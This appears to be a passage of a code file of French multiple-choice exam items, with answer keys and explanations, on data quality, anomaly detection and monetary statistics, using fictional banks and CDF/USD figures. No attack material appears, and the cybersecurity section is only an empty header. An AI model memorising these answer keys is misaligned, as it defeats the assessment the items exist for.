      "Alpha a 1 000 crédits PME sur 1 200 (segment à environ 9-10 % de défaut), Beta seulement 200. Le taux global est une moyenne pondérée par la composition du portefeuille : 94 / 1 200 ≈ 7,8 % contre 45 / 1 200 = 3,75 % ≈ 3,8 %. Pour comparer la qualité de gestion du risque, il faut raisonner à structure comparable (par segment).",
    pourquoiPas: {
      A: "Les calculs sont justes : c'est précisément le paradoxe de Simpson, où l'agrégation inverse la tendance des sous-groupes.",
      B: "Rien dans les données n'indique une sous-déclaration : l'inversion s'explique entièrement par la composition des portefeuilles.",
      D: "Le taux global mélange performance et structure du portefeuille ; ignorer les segments conduit à une conclusion trompeuse.",
    },
    aRetenir: "Avant de comparer des taux agrégés, vérifiez la composition des groupes (paradoxe de Simpson).",
  },

  // ─────────────────────────── Qualité des données ───────────────────────────
  {
    id: 'DATA-DQ-001',
    section: 'technique',
    filiere: 'data',
    competence: 'Qualité des données',
    difficulte: 'facile',
    enonce:
      "Dans une déclaration réglementaire reçue de la Banque Beta, plusieurs opérations portent la date de valeur « 2026-02-30 ». Quelle dimension de la qualité des données est d'abord en cause ?",
    options: [
      { id: 'A', texte: "La complétude, car l'information de date est manquante." },
      { id: 'B', texte: "La validité, car la valeur ne respecte pas le domaine des dates possibles." },
      { id: 'C', texte: "L'actualité, car la déclaration est arrivée après l'échéance." },
      { id: 'D', texte: "L'unicité, car la même opération est enregistrée plusieurs fois." },
    ],
    bonneReponse: 'B',
    explication:
      "Le 30 février n'existe pas : la valeur viole une règle de domaine, ce qui relève de la validité (conformité au format, au type et aux valeurs admises). Ce contrôle peut être automatisé dès l'ingestion. L'exactitude, elle, porterait sur une date valide mais différente de la date réelle de l'opération.",
    pourquoiPas: {
      A: "Le champ est renseigné : il n'y a pas de valeur manquante, mais une valeur impossible.",
      C: "L'actualité concerne le délai de mise à disposition des données, pas le contenu d'un champ.",
      D: "Rien n'indique de doublon : le problème porte sur la valeur de la date, pas sur la répétition d'enregistrements.",
    },
    aRetenir: "Validité = respect du format et du domaine ; exactitude = conformité à la réalité.",
  },
  {
    id: 'DATA-DQ-002',
    section: 'technique',
    filiere: 'data',
    competence: 'Qualité des données',
    difficulte: 'moyen',
    enonce:
      "Lors de la constitution d'un fichier clients consolidé, un analyste exécute la requête suivante. Que renvoie-t-elle ?",
    extrait: {
      langage: 'sql',
      contenu: `SELECT numero_piece_identite, date_naissance, COUNT(*) AS nb
FROM clients_banque_alpha
GROUP BY numero_piece_identite, date_naissance
HAVING COUNT(*) > 1;`,
    },
    options: [
      { id: 'A', texte: "La liste de tous les clients qui détiennent plusieurs comptes bancaires." },
      { id: 'B', texte: "La liste des clients qui n'apparaissent qu'une seule fois dans la table." },
      { id: 'C', texte: "Toutes les lignes en double, chacune avec son identifiant, prêtes à être supprimées." },
      { id: 'D', texte: "Une ligne par couple pièce + date de naissance présent plusieurs fois : des doublons potentiels." },
    ],
    bonneReponse: 'D',
    explication:
      "GROUP BY regroupe les lignes par couple (pièce d'identité, date de naissance) et HAVING COUNT(*) > 1 ne garde que les couples répétés. Le résultat liste donc les doublons potentiels de clients, avec leur nombre d'occurrences. Ces cas doivent ensuite être examinés (règles de fusion, enregistrement « maître ») avant toute suppression.",
    pourquoiPas: {
      A: "La table porte sur les clients, pas sur les comptes : la requête détecte des fiches client répétées, pas la multi-détention de comptes.",
      B: "C'est l'inverse : HAVING COUNT(*) > 1 exclut justement les couples présents une seule fois.",
      C: "Le GROUP BY renvoie une ligne agrégée par couple, sans identifiant de ligne ; et un doublon détecté doit être analysé avant suppression.",
    },
    aRetenir: "GROUP BY + HAVING COUNT(*) > 1 : le réflexe pour repérer des doublons sur une clé métier.",
  },
  {
    id: 'DATA-DQ-003',
    section: 'technique',
    filiere: 'data',
    competence: 'Qualité des données',
    difficulte: 'moyen',
    enonce:
      "Une table stocke les cours de change de référence quotidiens publiés pour plusieurs devises (USD, EUR, ZAR…), à raison d'un cours par devise et par jour. Quelle clé primaire est la plus appropriée ?",
    options: [
      { id: 'A', texte: "La combinaison (date_cours, code_devise)." },
      { id: 'B', texte: "La colonne date_cours seule." },
      { id: 'C', texte: "La colonne code_devise seule." },
      { id: 'D', texte: "La colonne valeur_cours, car chaque cours est différent." },
    ],
    bonneReponse: 'A',
    explication:
      "La règle métier est « un cours par devise et par jour » : c'est exactement le couple (date, devise) qui identifie une ligne de façon unique. Cette clé composite empêche aussi techniquement l'insertion d'un second cours pour la même devise le même jour. Une clé primaire doit être unique, non nulle et stable.",
    pourquoiPas: {
      B: "Une même date comporte un cours par devise : la date seule se répète et ne peut pas être unique.",
      C: "Chaque devise a un cours chaque jour : le code devise se répète d'une date à l'autre.",
      D: "Une valeur de mesure n'est pas un identifiant : deux cours peuvent coïncider et une correction modifierait la clé.",
    },
    aRetenir: "La clé primaire traduit la règle d'unicité métier ; elle est souvent composite.",
  },
  {
    id: 'DATA-DQ-004',
    section: 'technique',
    filiere: 'data',
    competence: 'Qualité des données',
    difficulte: 'difficile',
    enonce:
      "Dans une enquête fictive sur l'endettement des ménages, le revenu est manquant pour 20 % des répondants, surtout parmi les hauts revenus qui refusent de le déclarer. Quelle affirmation est correcte ?",
    options: [
      { id: 'A', texte: "Les données sont manquantes complètement au hasard (MCAR) : supprimer ces lignes est sans conséquence." },
      { id: 'B', texte: "Imputer par la moyenne des revenus observés corrige le biais, car elle utilise toute l'information disponible." },
      { id: 'C', texte: "L'absence dépend de la valeur elle-même (MNAR) : une imputation par la moyenne sous-estimerait les revenus." },
      { id: 'D', texte: "Il suffit de remplacer les valeurs manquantes par zéro, ce qui reste neutre pour les statistiques." },
    ],
    bonneReponse: 'C',
    explication:
      "Les valeurs manquent précisément parce qu'elles sont élevées : c'est un mécanisme MNAR (missing not at random). La moyenne des revenus observés est tirée vers le bas ; l'utiliser pour imputer sous-estime le revenu moyen et réduit artificiellement la variance. Il faut documenter le mécanisme, analyser sa sensibilité et recourir à des méthodes adaptées (variables auxiliaires, modélisation explicite).",
    pourquoiPas: {
      A: "MCAR suppose que l'absence ne dépend de rien ; ici elle dépend du niveau de revenu, donc la suppression biaise les résultats.",
      B: "La moyenne observée est elle-même biaisée vers le bas ; l'imputer propage le biais et écrase la dispersion.",
      D: "Remplacer par zéro introduit des revenus fictifs nuls et fausse gravement moyenne et dispersion.",
    },
    aRetenir: "Avant d'imputer, identifiez le mécanisme d'absence : MCAR, MAR ou MNAR.",
  },
  {
    id: 'DATA-DQ-005',
    section: 'technique',
    filiere: 'data',
    competence: 'Qualité des données',
    difficulte: 'facile',
    enonce:
      "Dans les fichiers transmis par différents services, le même établissement apparaît sous les libellés « Banque Alpha », « BQ ALPHA SA » et « Banque Alpha S.A. ». Quelle est la meilleure solution durable ?",
    options: [
      { id: 'A', texte: "Corriger manuellement les libellés à chaque nouveau rapport." },
      { id: 'B', texte: "S'appuyer sur un référentiel des établissements avec un code unique utilisé partout." },
      { id: 'C', texte: "Conserver les trois libellés, puisque chaque service a ses habitudes." },
      { id: 'D', texte: "Mettre tous les libellés en majuscules pour qu'ils deviennent identiques." },
    ],
    bonneReponse: 'B',
    explication:
      "Un référentiel (donnée de référence ou « master data ») attribue à chaque établissement un identifiant unique et un libellé officiel, maintenus par un responsable désigné. Les systèmes manipulent ensuite le code et non le libellé libre, ce qui garantit des jointures et des agrégations fiables.",
    pourquoiPas: {
      A: "La correction manuelle est coûteuse, source d'erreurs et doit être refaite à chaque rapport.",
      C: "Trois libellés pour une même entité fragmentent les agrégats : les totaux par établissement seraient faux.",
      D: "La casse ne règle pas « BQ » vs « BANQUE » ni « SA » vs « S.A. » : les libellés resteraient différents.",
    },
    aRetenir: "Identifiez les entités par un code de référentiel, jamais par un libellé libre.",
  },
  {
    id: 'DATA-DQ-006',
    section: 'technique',
    filiere: 'data',
    competence: 'Qualité des données',
    difficulte: 'moyen',
    enonce:
      "Dans un dispositif de gouvernance des données, qui est responsable en dernier ressort (« accountable ») de la définition, des règles de qualité et des droits d'accès d'un domaine comme les statistiques de crédit ?",
    options: [
      { id: 'A', texte: "Le propriétaire des données (data owner), généralement un responsable métier du domaine." },
      { id: 'B', texte: "L'administrateur de la base de données, qui gère le stockage." },
      { id: 'C', texte: "Chaque utilisateur, pour les données qu'il consulte." },
      { id: 'D', texte: "Le fournisseur du logiciel de base de données." },
    ],
    bonneReponse: 'A',
    explication:
      "Le data owner, côté métier, porte la responsabilité finale du domaine : définitions, niveau de qualité attendu, règles d'accès. Le data steward (gestionnaire de données) met en œuvre ces règles au quotidien : documentation, suivi des indicateurs de qualité, traitement des anomalies. L'équipe technique assure l'exploitation de la plateforme.",
    pourquoiPas: {
      B: "L'administrateur gère l'infrastructure technique ; il ne décide ni du sens métier ni des règles de qualité.",
      C: "Une responsabilité diluée entre tous les utilisateurs n'est la responsabilité de personne.",
      D: "Un fournisseur externe n'a aucune légitimité sur la signification et l'usage des données de l'institution.",
    },
    aRetenir: "Data owner = responsable métier qui décide ; data steward = gestionnaire qui applique au quotidien.",
  },
  {
    id: 'DATA-DQ-007',
    section: 'technique',
    filiere: 'data',
    competence: 'Qualité des données',
    difficulte: 'moyen',
    enonce:
      "La Banque Alpha transmet chaque mois un fichier de déclaration des dépôts dont la structure (fictive) est donnée ci-dessous. Quel contrôle à l'ingestion détecte le mieux un fichier tronqué ou altéré pendant le transfert ?",
    extrait: {
      langage: 'texte',
      contenu: `ENTETE;BANQUE_ALPHA;DECL_DEPOTS;2026-03-31
LIGNE;0001;COMPTE_A;CDF;1250000
LIGNE;0002;COMPTE_B;CDF;3400000
...
PIED;NB_LIGNES=1250;TOTAL_MONTANTS=84512300000`,
    },
    options: [
      { id: 'A', texte: "Vérifier que le nom du fichier contient bien la date d'arrêté." },
      { id: 'B', texte: "Charger le fichier puis attendre que les utilisateurs signalent des écarts." },
      { id: 'C', texte: "Contrôler uniquement que la taille du fichier n'est pas nulle." },
      { id: 'D', texte: "Recompter les lignes et totaliser les montants, puis comparer au pied ; en cas d'écart, mettre en quarantaine." },
    ],
    bonneReponse: 'D',
    explication:
      "Le pied de fichier fournit des totaux de contrôle (nombre de lignes, somme des montants). Les recalculer à la réception et les comparer permet de détecter un fichier incomplet ou corrompu AVANT chargement. En cas d'écart, le fichier est rejeté ou mis en quarantaine et l'émetteur est notifié.",
    pourquoiPas: {
      A: "Le nom du fichier peut être correct alors que son contenu est tronqué : ce contrôle ne vérifie pas les données.",
      B: "Détecter les erreurs après diffusion est tardif et coûteux : les contrôles doivent intervenir à l'entrée.",
      C: "Un fichier tronqué n'est pas vide : un contrôle de taille non nulle ne le détecte pas.",
    },
    aRetenir: "À l'ingestion : recomptez, retotalisez, comparez au pied, rejetez avant de charger.",
  },

  // ─────────────────────────── Détection d'anomalies ───────────────────────────
  {
    id: 'DATA-ANO-001',
    section: 'technique',
    filiere: 'data',
    competence: 'Détection d’anomalies',
    difficulte: 'facile',
    enonce:
      "Dans cet exemple fictif, les retraits quotidiens d'une agence de la Banque Beta ont une moyenne de 200 millions de CDF et un écart-type de 25 millions. Un jour, les retraits atteignent 290 millions. Quel est le z-score et que conclure avec un seuil |z| > 3 ?",
    options: [
      { id: 'A', texte: "z = 1,45 : valeur normale, sous le seuil." },
      { id: 'B', texte: "z = 11,6 : valeur extrêmement anormale." },
      { id: 'C', texte: "z = 3,6 : valeur atypique, à examiner." },
      { id: 'D', texte: "z = 0,28 : valeur proche de la moyenne." },
    ],
    bonneReponse: 'C',
    explication:
      "z = (290 − 200) / 25 = 90 / 25 = 3,6. Le jour observé se situe à 3,6 écarts-types au-dessus de la moyenne, au-delà du seuil de 3 : il est signalé comme atypique. Atypique ne veut pas dire frauduleux : l'alerte déclenche une analyse (paie, événement local, etc.).",
    pourquoiPas: {
      A: "1,45 = 290 / 200 est un simple ratio à la moyenne, sans soustraction ni division par l'écart-type.",
      B: "11,6 = 290 / 25 : la moyenne n'a pas été soustraite avant de diviser par l'écart-type.",
      D: "0,28 ≈ 25 / 90 inverse numérateur et dénominateur de la formule.",
    },
    aRetenir: "z = (x − moyenne) / écart-type : le nombre d'écarts-types qui séparent x de la moyenne.",
  },
  {
    id: 'DATA-ANO-002',
    section: 'technique',
    filiere: 'data',
    competence: 'Détection d’anomalies',
    difficulte: 'moyen',
    enonce:
      "Pour des montants de transferts (série fictive, en milliers d'USD), on dispose des statistiques ci-dessous. Selon la règle de Tukey (bornes à 1,5 × IQR), quelles valeurs sont signalées comme atypiques ?",
    extrait: {
      langage: 'texte',
      contenu: `Q1 = 120    médiane = 150    Q3 = 180
Valeurs à tester : 25   45   150   265   275   310`,
    },
    options: [
      { id: 'A', texte: '275 et 310 uniquement' },
      { id: 'B', texte: '25, 275 et 310' },
      { id: 'C', texte: '25, 45, 265, 275 et 310' },
      { id: 'D', texte: 'Aucune valeur' },
    ],
    bonneReponse: 'B',
    explication:
      "IQR = 180 − 120 = 60 ; 1,5 × IQR = 90. Borne basse = 120 − 90 = 30 ; borne haute = 180 + 90 = 270. Sont atypiques les valeurs < 30 ou > 270 : 25, 275 et 310.",
    pourquoiPas: {
      A: "Seule la borne haute a été appliquée : 25 est sous la borne basse de 30 et doit aussi être signalé.",
      C: "Les bornes ont été centrées sur la médiane (150 ± 90 = [60 ; 240]) au lieu de partir de Q1 et Q3.",
      D: "Ce résultat correspond à des bornes à 3 × IQR ([−60 ; 360]), réservées aux valeurs « extrêmes ».",
    },
    aRetenir: "Bornes de Tukey : [Q1 − 1,5 × IQR ; Q3 + 1,5 × IQR].",
  },
  {
    id: 'DATA-ANO-003',
    section: 'technique',
    filiere: 'data',
    competence: 'Détection d’anomalies',
    difficulte: 'moyen',
    enonce:
      "Dans cet exemple, toute opération en espèces d'au moins 10 000 USD (seuil fictif) déclenche une déclaration. Un client effectue le même jour, dans trois agences différentes, des dépôts de 9 800, 9 900 et 9 700 USD. Quelle règle de détection est la plus adaptée ?",
    options: [
      { id: 'A', texte: "Agréger les opérations par client sur une fenêtre glissante et repérer les montants répétés juste sous le seuil." },
      { id: 'B', texte: "Contrôler chaque opération isolément par rapport au seuil de 10 000 USD." },
      { id: 'C', texte: "Ne surveiller que les agences où le client a ouvert son compte." },
      { id: 'D', texte: "Relever le seuil à 30 000 USD pour réduire le nombre d'alertes." },
    ],
    bonneReponse: 'A',
    explication:
      "Le schéma décrit est un fractionnement (« smurfing ») : des opérations volontairement maintenues sous le seuil. Seule une agrégation par client, toutes agences confondues et sur une fenêtre de temps (ici 29 400 USD en une journée), le révèle. On complète par un indicateur de fréquence des montants situés juste sous le seuil.",
    pourquoiPas: {
      B: "C'est exactement le contrôle que le fractionnement contourne : chaque dépôt, pris seul, reste sous 10 000 USD.",
      C: "Le fractionnement exploite justement la dispersion entre agences : il faut une vision consolidée du client.",
      D: "Relever le seuil réduit les alertes mais aveugle davantage le dispositif face au fractionnement.",
    },
    aRetenir: "Contre le fractionnement : agréger par client et par fenêtre de temps, toutes agences confondues.",
  },
  {
    id: 'DATA-ANO-004',
    section: 'technique',
    filiere: 'data',
    competence: 'Détection d’anomalies',
    difficulte: 'moyen',
    enonce:
      "Voici un extrait fictif du journal d'un système de paiement. Quelle paire de lignes est le plus vraisemblablement un doublon technique (même ordre reçu deux fois) ?",
    extrait: {
      langage: 'texte',
      contenu: `ref_bout_en_bout  horodatage           donneur   beneficiaire  montant (CDF)
E2E-7781          2026-03-02 10:15:02  Alpha-01  Beta-77       1 500 000
E2E-7781          2026-03-02 10:15:05  Alpha-01  Beta-77       1 500 000
E2E-7790          2026-03-02 10:40:11  Alpha-03  Gamma-12        250 000
E2E-7795          2026-03-02 10:41:30  Alpha-03  Gamma-12        250 000`,
    },
    options: [
      { id: 'A', texte: "E2E-7790 et E2E-7795, car donneur, bénéficiaire et montant sont identiques." },
      { id: 'B', texte: "Aucune paire, car les horodatages sont tous différents." },
      { id: 'C', texte: "Les quatre lignes, car elles concernent toutes la Banque Alpha comme émettrice." },
      { id: 'D', texte: "Les deux lignes E2E-7781 : même référence unique reçue deux fois, à 3 secondes d'intervalle." },
    ],
    bonneReponse: 'D',
    explication:
      "La référence de bout en bout est censée identifier un ordre de manière unique : la recevoir deux fois, avec des attributs identiques et 3 secondes d'écart, signe un rejeu technique. Les lignes E2E-7790 et E2E-7795 ont des références distinctes : ce peuvent être deux paiements légitimes du même montant, à vérifier mais pas à rejeter d'office.",
    pourquoiPas: {
      A: "Des références distinctes indiquent deux ordres différents : un même montant entre les mêmes parties peut être légitime.",
      B: "Un rejeu technique est horodaté à la réception : un horodatage différent n'exclut pas le doublon.",
      C: "Avoir le même émetteur ne fait pas de quatre ordres des doublons ; seule l'identité de la référence est probante.",
    },
    aRetenir: "Doublon technique = même identifiant unique reçu deux fois ; même montant ≠ doublon.",
  },
  {
    id: 'DATA-ANO-005',
    section: 'technique',
    filiere: 'data',
    competence: 'Détection d’anomalies',
    difficulte: 'moyen',
    enonce:
      "Un modèle de surveillance signale chaque année les retraits d'espèces de décembre comme anormaux, car ils dépassent nettement ceux de novembre (série fictive). L'historique montre le même pic tous les mois de décembre. Que faut-il faire ?",
    options: [
      { id: 'A', texte: "Relever le seuil d'alerte pour tous les mois de l'année." },
      { id: 'B', texte: "Supprimer les mois de décembre de l'historique utilisé par le modèle." },
      { id: 'C', texte: "Modéliser la saisonnalité et comparer décembre aux décembres précédents ou à une série désaisonnalisée." },
      { id: 'D', texte: "Escalader systématiquement chaque mois de décembre en suspicion de fraude." },
    ],
    bonneReponse: 'C',
    explication:
      "Un pic récurrent à la même période (fêtes, primes de fin d'année) est une saisonnalité, pas une anomalie. La référence pertinente est l'attendu saisonnier : même mois des années précédentes ou série corrigée des variations saisonnières. Une anomalie est alors un écart à ce comportement attendu.",
    pourquoiPas: {
      A: "Un seuil global relevé rendrait le modèle aveugle aux vraies anomalies des autres mois.",
      B: "Supprimer décembre empêche justement de détecter une anomalie réelle survenant en décembre.",
      D: "Escalader un phénomène saisonnier connu multiplie les faux positifs et use les équipes d'analyse.",
    },
    aRetenir: "Comparez une valeur à son attendu saisonnier, pas au mois précédent.",
  },
  {
    id: 'DATA-ANO-006',
    section: 'technique',
    filiere: 'data',
    competence: 'Détection d’anomalies',
    difficulte: 'difficile',
    enonce:
      "Un modèle LBC/FT est testé sur 10 000 transactions fictives, dont 50 réellement suspectes. Il en signale 400, parmi lesquelles 40 sont réellement suspectes. Quelle affirmation est correcte ?",
    extrait: {
      langage: 'texte',
      contenu: `                     Réellement suspecte   Non suspecte
Signalée par modèle          40                360
Non signalée                 10              9 590`,
    },
    options: [
      { id: 'A', texte: "Précision 80 % ; rappel 10 % ; 360 faux positifs." },
      { id: 'B', texte: "Précision 10 % ; rappel 80 % ; 360 faux positifs." },
      { id: 'C', texte: "Précision 10 % ; rappel 80 % ; 10 faux positifs." },
      { id: 'D', texte: "Précision 0,4 % ; rappel 80 % ; 360 faux positifs." },
    ],
    bonneReponse: 'B',
    explication:
      "Précision = VP / signalées = 40 / 400 = 10 % ; rappel = VP / réellement suspectes = 40 / 50 = 80 %. Les 360 alertes non fondées sont des faux positifs ; les 10 cas suspects manqués sont des faux négatifs. En LBC/FT, un faux négatif (blanchiment non détecté) est souvent jugé plus grave, mais une précision de 10 % signifie que 9 alertes sur 10 mobilisent les analystes inutilement.",
    pourquoiPas: {
      A: "Précision et rappel sont inversés : la précision rapporte les vrais positifs aux alertes, le rappel aux cas réellement suspects.",
      C: "10 correspond aux faux négatifs (cas suspects non signalés) ; les faux positifs sont les 360 alertes non fondées.",
      D: "0,4 % = 40 / 10 000 rapporte les vrais positifs à toutes les transactions, ce qui n'est pas la précision.",
    },
    aRetenir: "Précision = qualité des alertes ; rappel = part des vrais cas détectés.",
  },

  // ─────────────────────── Économie & données monétaires ───────────────────────
  {
    id: 'DATA-ECO-001',
    section: 'technique',
    filiere: 'data',
    competence: 'Économie & données monétaires',
    difficulte: 'moyen',
    enonce:
      "À partir de l'indice des prix à la consommation ci-dessous (série fictive), quel est le taux d'inflation en glissement annuel pour décembre de l'année N, arrondi à 0,1 % près ?",
    extrait: {
      langage: 'texte',
      contenu: `Mois          Indice des prix (série fictive)
Déc. N-1          180,0
...
Nov. N            204,0
Déc. N            207,9`,
    },
    options: [
      { id: 'A', texte: '15,5 %' },
      { id: 'B', texte: '27,9 %' },
      { id: 'C', texte: '13,4 %' },
      { id: 'D', texte: '1,9 %' },
    ],
    bonneReponse: 'A',
    explication:
      "Le glissement annuel compare un mois au même mois de l'année précédente : (207,9 / 180,0 − 1) × 100 = 15,5 %. Le dénominateur est toujours la valeur de la période de référence (déc. N-1).",
    pourquoiPas: {
      B: "27,9 est l'écart en points d'indice (207,9 − 180,0), pas une variation en pourcentage.",
      C: "13,4 % = 27,9 / 207,9 : le dénominateur utilisé est la valeur finale au lieu de la valeur initiale.",
      D: "1,9 % = 207,9 / 204,0 − 1 est la variation mensuelle (décembre sur novembre), pas le glissement annuel.",
    },
    aRetenir: "Glissement annuel = indice du mois / indice du même mois un an avant − 1.",
  },
  {
    id: 'DATA-ECO-002',
    section: 'technique',
    filiere: 'data',
    competence: 'Économie & données monétaires',
    difficulte: 'difficile',
    enonce:
      "Dans cet exemple fictif, le cours passe de « 1 USD = 2 500 CDF » à « 1 USD = 2 800 CDF ». Mesurée par la variation de la valeur d'un franc congolais exprimée en dollars (USD par CDF), quelle est l'évolution du CDF, arrondie à 0,1 % près ?",
    options: [
      { id: 'A', texte: 'Dépréciation du CDF de 12,0 %' },
      { id: 'B', texte: 'Appréciation du CDF de 12,0 %' },
      { id: 'C', texte: 'Appréciation du CDF de 10,7 %' },
      { id: 'D', texte: 'Dépréciation du CDF de 10,7 %' },
    ],
    bonneReponse: 'D',
    explication:
      "Il faut désormais plus de CDF pour 1 USD : le CDF perd de la valeur. En USD par CDF : (1/2 800) / (1/2 500) − 1 = 2 500 / 2 800 − 1 ≈ −10,7 %. Le chiffre de 12,0 % (2 800 / 2 500 − 1) mesure l'appréciation de l'USD exprimée en CDF : les deux pourcentages diffèrent à cause de l'asymétrie des variations relatives.",
    pourquoiPas: {
      A: "12,0 % mesure la hausse du prix de l'USD en CDF, c'est-à-dire l'appréciation de l'USD, pas la variation de la valeur du CDF.",
      B: "Avec la cotation « 1 USD = X CDF », une hausse de X signifie que le CDF se déprécie, pas qu'il s'apprécie.",
      C: "Le chiffre de 10,7 % est le bon, mais le sens est inversé : le CDF perd de la valeur.",
    },
    aRetenir: "Cotation « 1 USD = X CDF » : X qui monte = CDF qui se déprécie ; les % ne sont pas symétriques.",
  },
  {
    id: 'DATA-ECO-003',
    section: 'technique',
    filiere: 'data',
    competence: 'Économie & données monétaires',
    difficulte: 'facile',
    enonce:
      "Voici des cours moyens mensuels fictifs (1 USD = X CDF). Quelle est la moyenne mobile sur 3 mois calculée pour le mois d'avril ?",
    extrait: {
      langage: 'texte',
      contenu: `Mois      Janv.   Févr.   Mars    Avr.
Cours     2 600   2 640   2 700   2 760`,
    },
    options: [
      { id: 'A', texte: '2 646,7 CDF' },
      { id: 'B', texte: '2 675,0 CDF' },
      { id: 'C', texte: '2 700,0 CDF' },
      { id: 'D', texte: '2 680,0 CDF' },
    ],
    bonneReponse: 'C',
    explication:
      "La moyenne mobile (non centrée) sur 3 mois en avril porte sur février, mars et avril : (2 640 + 2 700 + 2 760) / 3 = 8 100 / 3 = 2 700. Elle lisse les fluctuations de court terme pour faire ressortir la tendance.",
    pourquoiPas: {
      A: "2 646,7 = (2 600 + 2 640 + 2 700) / 3 est la moyenne mobile de mars, décalée d'un mois.",
      B: "2 675 est la moyenne des quatre mois, et non une fenêtre de trois mois.",
      D: "2 680 = (2 600 + 2 760) / 2 ne fait que la moyenne des extrémités de la série.",
    },
    aRetenir: "Moyenne mobile sur k périodes = moyenne des k dernières valeurs, la fenêtre glissant à chaque période.",
  },
  {
    id: 'DATA-ECO-004',
    section: 'technique',
    filiere: 'data',
    competence: 'Économie & données monétaires',
    difficulte: 'difficile',
    enonce:
      "Dans cet exemple fictif, un dépôt à terme rapporte un taux nominal de 25 % par an et l'inflation anticipée est de 18 %. Quel est le taux d'intérêt réel selon l'approximation de Fisher, puis selon la formule exacte (arrondi à 0,1 % près) ?",
    options: [
      { id: 'A', texte: 'Approximation 7,0 % ; formule exacte 7,0 %' },
      { id: 'B', texte: 'Approximation 7,0 % ; formule exacte 5,9 %' },
      { id: 'C', texte: 'Approximation −7,0 % ; formule exacte −5,6 %' },
      { id: 'D', texte: 'Approximation 43,0 % ; formule exacte 47,5 %' },
    ],
    bonneReponse: 'B',
    explication:
      "Approximation de Fisher : r ≈ i − π = 25 % − 18 % = 7,0 %. Formule exacte : (1 + i) / (1 + π) − 1 = 1,25 / 1,18 − 1 ≈ 5,9 %. L'approximation n'est fiable que pour des taux faibles ; avec des taux élevés, l'écart devient significatif.",
    pourquoiPas: {
      A: "La formule exacte ne donne pas le même résultat que l'approximation : l'écart (≈ 1,1 point) est sensible à ces niveaux de taux.",
      C: "Le sens est inversé (π − i et 1,18 / 1,25 − 1) : le taux nominal dépasse l'inflation, le taux réel est positif.",
      D: "Les taux ont été additionnés ou composés (1,25 × 1,18 − 1) au lieu de retrancher ou de diviser par l'inflation.",
    },
    aRetenir: "Taux réel ≈ nominal − inflation ; exactement (1 + i) / (1 + π) − 1.",
  },
  {
    id: 'DATA-ECO-005',
    section: 'technique',
    filiere: 'data',
    competence: 'Économie & données monétaires',
    difficulte: 'moyen',
    enonce:
      "Selon le mécanisme de transmission généralement décrit dans les manuels de macroéconomie, quel enchaînement suit une hausse du taux directeur d'une banque centrale, toutes choses égales par ailleurs ?",
    options: [
      { id: 'A', texte: "Refinancement plus cher → taux des crédits en hausse → crédit et demande ralentissent → pression inflationniste réduite." },
      { id: 'B', texte: "Refinancement moins cher → taux des crédits en baisse → crédit et demande accélèrent → inflation en hausse." },
      { id: 'C', texte: "Banques plus rentables → crédit plus abondant → monnaie nationale affaiblie → inflation en hausse." },
      { id: 'D', texte: "Refinancement plus cher → banques empruntant davantage → masse monétaire en hausse → inflation en hausse." },
    ],
    bonneReponse: 'A',
    explication:
      "Une hausse du taux directeur renchérit la liquidité pour les banques, qui relèvent leurs taux débiteurs : le crédit et la demande globale ralentissent, ce qui modère l'inflation. Par le canal du change, des rendements plus élevés sur les actifs en monnaie nationale tendent aussi à soutenir celle-ci. Ces effets s'exercent avec des délais et peuvent être affaiblis, notamment dans une économie fortement dollarisée.",
    pourquoiPas: {
      B: "C'est le mécanisme d'une BAISSE du taux directeur : le sens de la transmission est inversé.",
      C: "Une hausse du coût du refinancement freine le crédit et tend plutôt à soutenir la monnaie nationale.",
      D: "Un refinancement plus cher réduit, et non augmente, la demande de liquidité des banques auprès de la banque centrale.",
    },
    aRetenir: "Taux directeur ↑ → crédit plus cher → demande ↓ → inflation ↓ (avec délais).",
  },
  {
    id: 'DATA-ECO-006',
    section: 'technique',
    filiere: 'data',
    competence: 'Économie & données monétaires',
    difficulte: 'facile',
    enonce:
      "Le nombre annuel de transactions de monnaie électronique (série fictive) passe de 4 000 milliers en 2022 à 5 300 milliers en 2025. Quel est l'indice de 2025, base 100 en 2022 ?",
    options: [
      { id: 'A', texte: '75,5' },
      { id: 'B', texte: '32,5' },
      { id: 'C', texte: '132,5' },
      { id: 'D', texte: '1 300' },
    ],
    bonneReponse: 'C',
    explication:
      "Indice = valeur de l'année / valeur de l'année de base × 100 = 5 300 / 4 000 × 100 = 132,5. La série a donc progressé de 32,5 % entre 2022 et 2025. La base 100 permet de comparer l'évolution de séries d'unités ou de niveaux différents.",
    pourquoiPas: {
      A: "75,5 ≈ 4 000 / 5 300 × 100 : le rapport est inversé, l'année de base doit être au dénominateur.",
      B: "32,5 est le taux de variation en %, pas l'indice ; l'indice vaut 100 + 32,5.",
      D: "1 300 est l'écart absolu en milliers de transactions, pas un indice.",
    },
    aRetenir: "Indice base 100 = valeur / valeur de base × 100 ; indice − 100 = variation en %.",
  },
  {
    id: 'DATA-ECO-007',
    section: 'technique',
    filiere: 'data',
    competence: 'Économie & données monétaires',
    difficulte: 'moyen',
    enonce:
      "On veut agréger les dépôts du système bancaire au 31 mars (données fictives) et calculer la part des dépôts en devises (taux de dollarisation des dépôts), arrondie à 0,1 % près. Quel résultat et quelle méthode sont corrects ?",
    extrait: {
      langage: 'texte',
      contenu: `Encours au 31/03 (fictif)
Dépôts en CDF             : 1 200 milliards CDF
Dépôts en USD             :   900 millions USD
Cours de clôture au 31/03 : 1 USD = 2 800 CDF
Cours moyen du trimestre  : 1 USD = 2 750 CDF`,
    },
    options: [
      { id: 'A', texte: "Total 2 100 ; dollarisation 42,9 %, sans conversion préalable des montants." },
      { id: 'B', texte: "Total 3 675 Md CDF ; dollarisation 67,3 %, au cours moyen du trimestre." },
      { id: 'C', texte: "Total 3 720 Md CDF ; dollarisation 32,3 %, au cours de clôture du 31/03." },
      { id: 'D', texte: "Total 3 720 Md CDF ; dollarisation 67,7 %, au cours de clôture du 31/03." },
    ],
    bonneReponse: 'D',
    explication:
      "Les dépôts sont un stock mesuré à une date : on les convertit au cours de cette date (clôture), le cours moyen étant réservé aux flux de la période. 900 M USD × 2 800 = 2 520 Md CDF ; total = 1 200 + 2 520 = 3 720 Md CDF ; part en devises = 2 520 / 3 720 ≈ 67,7 %.",
    pourquoiPas: {
      A: "Additionner des CDF et des USD sans conversion mélange deux unités : le total et le ratio n'ont aucun sens.",
      B: "Le cours moyen convient aux flux de la période ; un encours à une date se convertit au cours de clôture de cette date.",
      C: "32,3 % = 1 200 / 3 720 est la part des dépôts en CDF, pas celle des dépôts en devises.",
    },
    aRetenir: "Stock → cours de clôture de la date ; flux → cours moyen de la période ; toujours convertir avant d'agréger.",
  },
];

// ===========================================================================
// TECHNIQUE — CYBERSÉCURITÉ
// ===========================================================================

